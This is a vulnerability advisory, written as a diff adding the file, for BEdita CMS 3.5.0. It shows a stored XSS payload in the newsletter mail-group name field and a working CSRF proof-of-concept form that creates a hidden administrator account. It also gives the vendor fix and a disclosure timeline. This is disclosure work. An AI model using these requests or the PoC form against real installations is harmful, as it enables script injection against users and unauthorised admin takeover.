@@ -1,0 +1,118 @@
+BEdita CMS - XSS & CSRF Vulnerability in Version 3.5.0
+
+----------------------------------------------------------------
+
+Product Information:
+
+Software: BEdita CMS
+Tested Version: 3.5.0, released 19.1.2015
+Vulnerability Type: Cross-Site Scripting (CWE-79) & Cross-Site Request Forgery, CSRF (CWE-352)
+Download link: http://www.bedita.com/download-bedita
+Description: A software to create, manage content and organize it with semantic rules. (copied from http://www.bedita.com/what-is-bedita)
+
+----------------------------------------------------------------
+
+Issues:
+
+1) XSS in newsletter mail group creation page.
+2) CSRF in user creation page.
+
+----------------------------------------------------------------
+
+Vulnerability description:
+
+1) XSS in newsletter mail group creation page
+
+When an authenticated user of BEdita CMS is creating a newsletter mail group, the following POST request is sent to the server:
+
+POST /bedita-3.5.0.corylus.2261e29/bedita/index.php/newsletter/saveMailGroups HTTP/1.1
+Host: 127.0.0.1
+Proxy-Connection: keep-alive
+Content-Length: 523
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://127.0.0.1/bedita-3.5.0.corylus.2261e29/bedita/index.php/newsletter/viewMailGroup/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: CAKEPHP=me57vjaqc2ts154qr342a6u6i2; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_limitsel=15; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; flash=yes; PHPSESSID=tg14v79ionj9d7lpelap300p33; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; _ga=GA1.1.621011711.1425057132
+
+data[MailGroup][id]=&data[MailGroup][group_name]=<script>alert(0)</script>&data[MailGroup][area_id]=1&data[MailGroup][visible]=1&data[MailGroup][security]=none&data[MailGroup][confirmation_in_message]=Hi [$user], 
+
+your+subscription+is+now+active,+soon+you'll+receive+the "[$title]"+newsletter.&data[MailGroup][confirmation_out_message]=Hi [$user], 
+
+you+have+been+unsubscribed+from "[$title]"
+
+The parameter data[MailGroup][group_name] is vulnerable to XSS.
+
+2) CSRF in user creation page
+
+When an authenticated administrative user of BEdita CMS is creating an user, the following POST request is sent to the server:
+
+POST /bedita-3.5.0.corylus.2261e29/bedita/index.php/users/saveUser HTTP/1.1
+Host: 127.0.0.1
+Proxy-Connection: keep-alive
+Content-Length: 339
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://127.0.0.1/bedita-3.5.0.corylus.2261e29/bedita/index.php/users/viewUser
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: CAKEPHP=me57vjaqc2ts154qr342a6u6i2; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_limitsel=15; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; flash=yes; PHPSESSID=tg14v79ionj9d7lpelap300p33; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; _ga=GA1.1.621011711.1425057132
+
+data[User][auth_type]=bedita&data[User][userid]=csrfadmin99&data[User][auth_params][userid]=&pwd=1qazXSW@&data[User][passwd]=1qazXSW@&data[User][realname]=csrfadmin99&data[User][email]=csrfadmin99@admin.com&data[User][valid]=1&groups=&data[groups][administrator]=on
+
+By executing the following Proof-of-Concept, a new user called "csrfadmin99" will be created with the password "1qazXSW@".
+
+<html>
+<body>
+<form action="http://127.0.0.1/bedita-3.5.0.corylus.2261e29/bedita/index.php/users/saveUser" method="POST">
+<input type="hidden" name="data[User][auth_type]" value="bedita" />
+<input type="hidden" name="data[User][userid]" value="csrfadmin99" />
+<input type="hidden" name="pwd" value="1qazXSW@" />
+<input type="hidden" name="data[User][passwd]" value="1qazXSW@" />
+<input type="hidden" name="data[User][realname]" value="csrfadmin99" />
+<input type="hidden" name="data[User][email]" value="csrfadmin99@admin.com" />
+<input type="hidden" name="data[User][valid]" value="1" />
+<input type="hidden" name="data[groups][administrator]" value="on" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
+
+----------------------------------------------------------------
+
+Impact:
+
+1) An attacker is able to leverage on the XSS vulnerability to exploit users of BEdita. An example would be to Inject malicious JavaScript code in order to use attacking tools like BeEF.
+2) An attacker is able to create an user account with administrator privilege.
+
+----------------------------------------------------------------
+
+Solution:
+
+Update to the latest version, which is 3.5.1, see https://groups.google.com/forum/?fromgroups#!topic/bedita/SOYrl5C-YRg
+
+----------------------------------------------------------------
+
+Timeline:
+
+Vulnerability found: 11.2.2015
+Vendor informed: 11.2.2015
+Response by vendor: 11.2.2015
+Fix by vendor 19.2.2015
+Public Advisory: 1.3.2015
+
+----------------------------------------------------------------
+
+References:
+https://github.com/bedita/bedita/issues/591
+https://github.com/bedita/bedita/issues/597
+
+----------------------------------------------------------------
+
